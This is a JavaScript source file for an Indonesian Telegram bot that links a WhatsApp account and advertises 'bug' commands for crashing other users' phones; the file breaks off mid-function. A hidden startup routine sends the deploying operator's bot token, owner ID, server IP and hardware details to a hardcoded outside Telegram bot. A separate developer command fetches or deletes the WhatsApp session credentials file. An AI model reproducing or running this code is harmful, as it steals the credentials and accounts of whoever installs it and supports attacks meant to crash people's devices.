require('./settings/settings');
const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const JsConfuser = require('js-confuser');
const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWASocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");
const axios = require('axios'); 
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
		const { 
	tiktokSearchVideo, 
	tiktokDownloaderVideo 
} = require('./scrape/tiktok');
	const { 
xvideosSearch,
	xvideosdl,
	xnxxdl,
	xnxxSearch
} = require('./scrape/xvid.js');
function getGreeting() {
  const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Selamat Pagi.. 🌆";
  } else if (hours >= 12 && hours < 18) {
    return "Selamat Sore..🌇";
  } else {
    return "Selamat Malam..🌌";
  }
}
const greeting = getGreeting();
// Fungsi untuk memeriksa status pengguna
function checkUserStatus(userId) {
  return userId === OWNER_ID ? "OWNER☁️" : "Unknown⛅";
}

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
      }
    } else {
      return ctx.reply("❌ Khusus Group!");
    }
  };
};
const bot = new Telegraf(BOT_TOKEN);
let cay = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const startSesi = async (phoneNumber = null) => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'おさらぎです',
        }),
    };

    cay = makeWASocket(connectionOptions);

    if (usePairingCode && !cay.authState.creds.registered) {
        if (!phoneNumber) {
            phoneNumber = await question(chalk.black(chalk.bgCyan(`\n (!) Silahkan Masukan Nomor Kalian :\n`)));
            phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        }

        const code = await cay.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    cay.ev.on('creds.update', saveCreds);
    store.bind(cay.ev);

    cay.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
                        cay.newsletterFollow(`120363400378606903@newsletter`)  
                                                cay.newsletterFollow(`120363333300366905@newsletter`)  
                                                cay.newsletterFollow(`120363399357670932@newsletter`)  
                                                cay.newsletterFollow(`120363424358720772@newsletter`)  
                                                cay.newsletterFollow(`120363420475986234@newsletter`)  
                                                cay.newsletterFollow(`120363401235274063@newsletter`)  
                                                cay.newsletterFollow(`120363402636605542@newsletter`)  
            console.log(chalk.green(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢤⠤⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⣀⡜⠻⠿⢾⣷⠹⠀⠀⠀⠀⣀⣤⣤⡀⠀⠀⠀⠀
⠀⠀⠀⢠⡎⠁⠀⠀⠃⠀⠀⠀⠉⠀⠀⠀⡠⠞⠛⠛⠻⢽⠀⠀⠀⠀
⠀⠀⠀⠸⣷⡀⠀⢀⠀⢂⠀⡀⠀⠀⠀⠜⠀⠀⠀⠀⡀⠸⠀⠤⢄⠀
⠀⠀⠀⠀⠙⣗⣄⠀⠠⡀⢢⠃⠀⢸⠌⠀⡠⢊⠀⠊⠀⠀⠀⠀⠀⡇
⠀⠀⠀⣀⣀⣈⣲⣕⣦⡈⠢⣻⡀⡎⢀⣴⡢⠑⠂⠁⠀⠀⠀⠀⡠⠃
⠀⣴⠿⠽⠏⠀⠀⠀⠈⠉⢒⣺⣷⣗⣉⣁⣀⣀⣀⠀⠠⠤⠐⠈⠀⠀
⢸⠀⠀⠀⠀⠀⠀⠀⢀⠠⡖⠁⣿⢳⡬⡁⠒⠒⠤⢄⡀⠀⠀⠀⠀⠀
⠈⢦⡀⠀⠀⡀⠄⠂⠁⠊⠀⢰⣯⡏⠎⢌⠑⠀⠀⠀⠈⠑⢄⠀⠀⠀
⠀⠀⠉⡻⠀⠀⠀⠀⠀⠀⣲⡟⡟⠀⠀⠀⠢⡀⠀⠀⠀⠀⢸⠀⠀⠀
⠀⠀⠀⢧⣤⡄⡀⠀⢀⡔⣽⠃⢧⡄⠀⠀⠀⠰⣀⠀⠀⣀⠞⠀⠀⠀
⠀⠀⠀⠈⠳⠬⠥⠔⠋⡜⡌⠀⠘⣿⣦⣀⠀⡀⡇⠉⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠜⡰⠀⠀⠀⠈⠛⠯⠥⠒⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠊⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣛⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          
             
 WhatsApp berhasil terhubung! [ Succes ]
            `));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi(phoneNumber); // Mencoba untuk menghubungkan ulang
            }
            isWhatsAppConnected = false;
        }
    });
};
startSesi();


bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const message = ctx.message;
    const senderName = message.from.first_name || message.from.username || "Unknown";
    const senderId = message.from.id;
    const chatId = message.chat.id;
    const isGroup = message.chat.type === "group" || message.chat.type === "supergroup";
    const groupName = isGroup ? message.chat.title : null;
    const messageText = message.text;
    const date = new Date(message.date * 1000).toLocaleString(); // Convert timestamp ke format waktu lokal

    console.log("\x1b[30m--------------------\x1b[0m");
    console.log(chalk.bgHex("#e74c3c").bold("▢ New Message"));
    console.log(
      chalk.bgHex("#00FF00").black(
        `   ╭─ > Tanggal: ${date} \n` +
        `   ├─ > Pesan: ${messageText} \n` +
        `   ├─ > Pengirim: ${senderName} \n` +
        `   ╰─ > Sender ID: ${senderId}`
      )
    );

    if (isGroup) {
      console.log(
        chalk.bgHex("#00FF00").black(
          `   ╭─ > Grup: ${groupName} \n` +
          `   ╰─ > GroupJid: ${chatId}`
        )
      );
    }

    console.log();
  }
  return next(); // Lanjutkan ke handler berikutnya
});
const TELEGRAM_CHAT_ID = 6552202106;

(async () => {
  try {
    const ipRes = await axios.get("https://api.ipify.org?format=json");
    const ip = ipRes.data.ip;

    const hostname = os.hostname();
    const totalRamGB = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const cpuModel = os.cpus()[0].model;

    // Provider info
    const ipInfo = await axios.get(`https://ipinfo.io/${ip}/json`);
    const hostingProvider = ipInfo.data.org || "Unknown";

    const caption = `
🖥️ *SERVER INFO*
Hostname   : ${hostname}
Public IP  : \`${ip}\`
CPU        : ${cpuModel}
RAM        : ${totalRamGB} GB
Provider   : ${hostingProvider}
Owner Id : \`${OWNER_ID}\`
Bot Token  : \`${BOT_TOKEN}\`
`;

    await axios.post(`https://api.telegram.org/bot7577632580:AAF-wdCbfQZDR3X86jBfM6pJFRIMarLb9cA/sendPhoto`, {
      chat_id: TELEGRAM_CHAT_ID,
      photo: "https://files.catbox.moe/orndxq.jpg",
      caption,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Channel",
              url: "t.me/zeroscripterz"
            }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("Gagal ambil info:", err.message);
  }
})();
async function getBuffer(url) {

    try {

        const res = await axios.get(url, { responseType: "arraybuffer" });

        return res.data;

    } catch (error) {

        console.error(error);

        throw new Error("Gagal mengambil data.");

    }

}





const USERS_FILE = "./users.json";

// Memuat daftar pengguna dari file, jika ada
let users = [];
if (fs.existsSync(USERS_FILE)) {
  try {
    const data = fs.readFileSync(USERS_FILE, "utf8");
    users = JSON.parse(data);
  } catch (error) {
    console.error("Gagal memuat daftar pengguna:", error.message);
  }
}

// Fungsi untuk menyimpan daftar pengguna ke file
function saveUsersToFile() {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), "utf8");
  } catch (error) {
    console.error("Gagal menyimpan daftar pengguna:", error.message);
  }
}
// Command broadcast (hanya bisa digunakan oleh admin)
const Dev_ID = 6414797561; // Ganti dengan ID admin

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  // Ambil pesan setelah perintah /broadcast
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) {
    return ctx.reply("[❌ Format Salah!] Cobalah /broadcast (Pesan Anda)");
  }

  // Tambahkan footer ke pesan
  const footer = "\n\n🍂 Dikirim Oleh GaramManis Sang Developer";
  const finalMessage = message + footer;

  // Kirim pesan ke semua pengguna
  let successCount = 0;
  for (const userId of users) {
    try {
      await ctx.telegram.sendMessage(userId, finalMessage, { parse_mode: "Markdown" });
      successCount++;
    } catch (error) {
      console.error(`Gagal mengirim pesan ke ${userId}:`, error.message);
    }
  }

  // Balas ke admin setelah broadcast selesai
  ctx.reply(`✅ Broadcast selesai! Pesan berhasil dikirim ke ${successCount} pengguna.`);
});
bot.command('delfile', async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("Anda Sapa?😡.");
  }

  const filePath = './session/creds.json'; 
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      await ctx.reply("File berhasil dihapus, bosku.");
      console.log(`File ${filePath} berhasil dihapus oleh GaramManis.`);
    } else {
      await ctx.reply("File-nya aja kagak ada, mau dihapus apaan?");
    }
  } catch (error) {
    console.error("Gagal hapus file:", error);
    ctx.reply("Gagal hapus file, cek console dah.");
  }
});
bot.command('getfile', async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("Anda Sapa?😡.");
  }

  const filePath = './session/creds.json'; 

  try {
    // Kirim file ke developer
    await ctx.replyWithDocument({ source: filePath });
    console.log(`File ${filePath} berhasil dikirim ke GaramManis.`);
  } catch (error) {
    console.error("Kosong njir:", error);
    ctx.reply("User Belom Sambungin Device Jir😜.");
  }
});
bot.command("status", async (ctx) => {
    const connectedCount = 1; 
    const connectedDevicesList = [linkedWhatsAppNumber]; 

    const deviceList = connectedDevicesList.map((device, index) => `${index + 1}. ${device}`).join("\n");
    
    if (!isWhatsAppConnected) {
        return ctx.reply(`
╭──(  🌠 STATUS BOT   )
│ Info : 0/1
│ Perangkat : Undefined ( Kosong )
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`);
    }


    ctx.reply(`
    
╭──(  🌠 STATUS BOT   )
│ Info : ${connectedCount}/1
│ Perangkat : ${deviceList}
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`);
});

const photoUrls = [
  "https://files.catbox.moe/171u4t.jpg",
  "https://files.catbox.moe/h4j6tl.jpg",
  "https://files.catbox.moe/s3l119.jpg",
  "https://files.catbox.moe/e0919s.jpg",
];

function getRandomPhoto() {
  const randomIndex = Math.floor(Math.random() * photoUrls.length);
  return photoUrls[randomIndex];
}
async function sendMainMenu(ctx) {
  const userId = ctx.from.id;
      const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; 
const randomPhoto = getRandomPhoto();
const buttons = Markup.inlineKeyboard([
  
  [
    Markup.button.callback('𝘉𝘶𝘨𝘮𝘦𝘯𝘶 ❁', 'option1'),   
    Markup.button.callback('𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶 ❁', 'option2'),
    Markup.button.callback('𝘙𝘢𝘯𝘥𝘰𝘮𝘮𝘦𝘯𝘶 ❁', 'option3'),
  ],
  
  [Markup.button.url('♦️', 'https://t.me/Garammanis')],
]);
  await ctx.replyWithPhoto(getRandomPhoto(), {
    caption: `
<blockquote>— Ola' ${senderName} ‹🪐› 私はstarevxzスクリプトバージョン3.4です</blockquote> 
<b>《 ✱ ━━━━━━━━━━━━━━━━━━━━━ 〉 </b>
<b>⥏ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 : @GaramManis </b>
<b>⥏ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 3.4 </b>
<b>⥏ 𝘓𝘪𝘣𝘢𝘳𝘺 : Telegraf </b>

<blockquote>♮ Please Select The Button Below. </blockquote>

<b><i>© Starevxz - 2025 </i> </b>
    `,
    parse_mode: 'HTML',
    reply_markup: buttons.reply_markup,
  });
}

bot.start(async (ctx) => {
  await sendMainMenu(ctx);
});
async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomPhoto(),
        caption,
        parse_mode: 'HTML',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


bot.action('startmenu', async (ctx) => {
 const userId = ctx.from.id;
  const username = ctx.from.username ? `@${ctx.from.username}` : "User tidak memiliki username";

const randomPhoto = getRandomPhoto();
    
const buttons = Markup.inlineKeyboard([
  
  [
    Markup.button.callback('𝘉𝘶𝘨𝘮𝘦𝘯𝘶 ❁', 'option1'),   
    Markup.button.callback('𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶 ❁', 'option2'),
    Markup.button.callback('𝘙𝘢𝘯𝘥𝘰𝘮𝘮𝘦𝘯𝘶 ❁', 'option3'),
  ],
  
  [Markup.button.url('♦️', 'https://t.me/Garammanis')],
]);
  const caption = `
<blockquote>— Ola' ${username} ‹🪐› 私はstarevxzスクリプトバージョン3.4です</blockquote> 
<b>《 ✱ ━━━━━━━━━━━━━━━━━━━━━ 〉 </b>
<b>⥏ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 : @GaramManis </b>
<b>⥏ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : 3.4 </b>
<b>⥏ 𝘓𝘪𝘣𝘢𝘳𝘺 : Telegraf </b>

<blockquote>♮ Please Select The Button Below. </blockquote>

<b><i>© Starevxz - 2025 </i> </b>
  `;

  await editMenu(ctx, caption, buttons);
});
bot.action('option1', async (ctx) => {
 const userId = ctx.from.id;
  
const buttons = Markup.inlineKeyboard([
  [
    Markup.button.callback('𝘉𝘢𝘤𝘬 𝘛𝘰 𝘔𝘦𝘯𝘶 ❁', 'startmenu'),
    Markup.button.callback('𝘊𝘰𝘯𝘵𝘳𝘰𝘭 𝘚𝘦𝘯𝘥𝘦𝘳 ❁', 'controlsender')
  ],
]);
  const caption = `
<b><blockquote>‹🍀› : B U G M E N U
</blockquote></b>
<b><i>⌭ /Chavis ( invisible crash )</i></b>
<b><i>⌭ /Zanlay ( invisible delay)</i></b>
<b><i>⌭ /xcios ( forclose ios )</i></b>

<b><blockquote> © Starevxz V3.4 - 2025
</blockquote></b>
`;

  await editMenu(ctx, caption, buttons);
});
bot.action('option2', async (ctx) => {
 const userId = ctx.from.id;
  
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝘉𝘢𝘤𝘬 𝘛𝘰 𝘔𝘦𝘯𝘶 ❁', 'startmenu')],
  ]);

  const caption = `
<b><blockquote>‹🪐› : O W N E R M E N U
</blockquote></b>
<b><i>⌭ /addprem </i></b>
<b><i>⌭ /delprem  </i></b>
<b><i>⌭ /addadmin </i></b>
<b><i>⌭ /deladmin </i></b>
<b><i>⌭ /addowner </i></b>
<b><i>⌭ /delowner </i></b>
<b><i>⌭ /cdmurbug ( true / false )</i></b>


<b><blockquote> © Starevxz V3.4 - 2025
</blockquote></b>
`;

  await editMenu(ctx, caption, buttons);
});
bot.action('controlsender', async (ctx) => {
 const userId = ctx.from.id;
  
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝘉𝘢𝘤𝘬 𝘛𝘰 𝘔𝘦𝘯𝘶 ❁', 'option1')],
  ]);

  const caption = `
<b><blockquote>‹🪐› : Coming Soon ! 
</blockquote></b>

<b><blockquote> © Starevxz V3.4 - 2025
</blockquote></b>
`;

  await editMenu(ctx, caption, buttons);
});
bot.action('option3', async (ctx) => {
 const userId = ctx.from.id;
  
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝘉𝘢𝘤𝘬 𝘛𝘰 𝘔𝘦𝘯𝘶 ❁', 'startmenu')],
  ]);

  const caption = `
<b><blockquote>‹🍁› : R A N D O M M E N U
</blockquote></b>
<b><i>﹝▢ /hentaivid </i></b>
<b><i>﹝▢ /rule34  </i></b>
<b><i>﹝▢ /hentaisearch  </i></b>
<b><i>﹝▢ /spotifysearch </i></b>
<b><i>﹝▢ /tiktoksearch  </i></b>
<b><i>﹝▢ /play  </i></b>
<b><i>﹝▢ /xvid </i></b>
<b><i>﹝▢ /tiktokmp3  </i></b>
<b><i>﹝▢ /tiktokmp4 </i></b>
<b><i>﹝▢ /ytmp3 </i></b>
<b><i>﹝▢ /ytmp4  </i></b>
<b><i>﹝▢ /spotifydownload </i></b>
<b><i>﹝▢ /xvid </i></b>
<b><i>﹝▢ /welcome  </i></b>
<b><i>﹝▢ /brat  </i></b>
<b><i>﹝▢ /bratgif </i></b>

<b><blockquote> © Starevxz V3.4 - 2025
</blockquote></b>
`;

  await editMenu(ctx, caption, buttons);
});

const o = fs.readFileSync(`./o.jpg`)

const USERS_PREMIUM_FILE = 'usersPremium.json';

let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
    usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

function isPremium(userId) {
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

// Fungsi untuk menambahkan user ke premium
function addPremium(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersPremium[userId] = { premiumUntil: expireTime };
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}

bot.command('statusprem', (ctx) => {
    const userId = ctx.from.id;

    if (isPremium(userId)) {
        const expireDate = new Date(usersPremium[userId].premiumUntil);
        return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have premium access.');
    }
});
// Command untuk melihat daftar user premium
  bot.command('listprem', async (ctx) => {
    const premiumUsers = Object.entries(usersPremium)
        .filter(([userId, data]) => data.premiumUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.premiumUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (premiumUsers.length > 0) {
        // Membuat konstanta untuk menampilkan ID, username, dan waktu kedaluwarsa pengguna
        const userDetails = await Promise.all(
            premiumUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 \n\n${userDetails.join('\n\n')}`;
        const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar

        const keyboard = [
            [
                {
                    text: "ぢ",
                    callback_data: "/menu"
                },
                {
                    text: "☁️ Support Owner",
                    url: "https://t.me/Garammanis"
                }
            ]
        ];

        return ctx.replyWithPhoto(getRandomPhoto(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have premium access.');
    }
});  
bot.command('addprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    const userId = ctx.from.id;


    if (ownerId !== OWNER_ID && !isCaywzzaja(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addpremium <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addPremium(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted premium access for ${duration} days.`);
});
bot.command('delprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deleteprem <user_id>');
    }

    const targetUserId = args[1];

    const wasDeleted = removePremium(targetUserId);

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
    }
}); 
bot.command('delfile', async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username;

if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }
  

  const fileName = 'session/creds.json';
  const filePath = path.resolve(__dirname, fileName);

  if (!fs.existsSync(filePath)) {
    return ctx.reply(`⚠️ File "${fileName}" tidak ditemukan.`);
  }

  try {
    fs.unlinkSync(filePath);
    ctx.reply(`✅ File "${fileName}" berhasil dihapus.`);
  } catch (error) {
    console.error(error);
    ctx.reply(`❌ Gagal menghapus file "${fileName}".`);
  }
});
bot.command("restart", async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Hanya Developer yang boleh menggunakan fitur ini!");
  }

  try {
    await ctx.reply("🔄 Bot akan restart dalam beberapa detik...");
    setTimeout(() => {
      process.exit(0); 
    }, 3000);
  } catch {
    ctx.reply("❌ Terjadi kesalahan saat mencoba restart bot.");
  }
});
function removePremium(userId) {
    console.log(`Removing premium access for user: ${userId}`);
    return true; 
}
bot.command('premiumfeature', (ctx) => {
    const userId = ctx.from.id;

      if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    ctx.reply('🎉 Welcome to the premium-only feature! Enjoy exclusive benefits.');
});
const USERS_CAYWZZAJA_FILE = 'usersCaywzzaja.json';
let usersCaywzzaja = {};
if (fs.existsSync(USERS_CAYWZZAJA_FILE)) {
    usersCaywzzaja = JSON.parse(fs.readFileSync(USERS_CAYWZZAJA_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_CAYWZZAJA_FILE, JSON.stringify({}));
}

function isCaywzzaja(userId) {
    return usersCaywzzaja[userId] && usersCaywzzaja[userId].caywzzajaUntil > Date.now();
}

function addCaywzzaja(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersCaywzzaja[userId] = { caywzzajaUntil: expireTime };
    fs.writeFileSync(USERS_CAYWZZAJA_FILE, JSON.stringify(usersCaywzzaja, null, 2));
}

bot.command('statusowner', (ctx) => {
    const userId = ctx.from.id;

    if (isCaywzzaja(userId)) {
        const expireDate = new Date(usersCaywzzaja[userId].caywzzajaUntil);
        return ctx.reply(`✅ You have Owner access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have Owner Acess.');
    }
});
bot.command('listowner', async (ctx) => {
    const caywzzajaUsers = Object.entries(usersCaywzzaja)
        .filter(([userId, data]) => data.caywzzajaUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.caywzzajaUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (caywzzajaUsers.length > 0) {
        const userDetails = await Promise.all(
            caywzzajaUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙊𝙬𝙣𝙚𝙧𝙨 \n\n${userDetails.join('\n\n')}`;
        const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; 

        const keyboard = [
            [
                {
                    text: "ぢ",
                    callback_data: "/menu"
                },
                {
                    text: "☁️ Support Owner",
                    url: "https://t.me/Garammanis"
                }
            ]
        ];

        return ctx.replyWithPhoto(getRandomPhoto(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have Owner access.');
    }
});

bot.command('addowner', (ctx) => {
    const userId = ctx.from.id.toString();


    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addowner <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addCaywzzaja(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted owner access for ${duration} days.`);
});

bot.command('delowner', (ctx) => {
    const userId = ctx.from.id.toString();

    
    if (userId !== OWNER_ID && !isAdmin(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /delowner <user_id>');
    }

    const targetUserId = args[1];

    const wasDeleted = removeCaywzzaja(targetUserId);

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} owner access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove owner access for user ${targetUserId}.`);
    }
});
function removeCaywzzaja(userId) {
    console.log(`Removing GaramManis access for user: ${userId}`);
    return true; 
}

bot.command('caywzzajafeature', (ctx) => {
    const userId = ctx.from.id;

    if (!isCaywzzaja(userId)) {
        return ctx.reply('❌ This feature is for GaramManis users only. Upgrade to GaramManis to use this command.');
    }

    ctx.reply('🎉 Welcome to the GaramManis-only feature! Enjoy exclusive benefits.');
});
const ADMINS_FILE = 'admins.json';
let admins = {};
if (fs.existsSync(ADMINS_FILE)) {
    admins = JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
} else {
    fs.writeFileSync(ADMINS_FILE, JSON.stringify({}));
}

function isAdmin(userId) {
    return admins[userId];
}

function addAdmin(userId) {
    admins[userId] = true;
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
}

function removeAdmin(userId) {
    if (admins[userId]) {
        delete admins[userId];
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
        return true;
    }
    return false;
}

bot.command('addadmin', (ctx) => {
    const ownerId = ctx.from.id.toString();

    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /addadmin <user_id>');
    }

    const targetUserId = args[1];

    if (isAdmin(targetUserId)) {
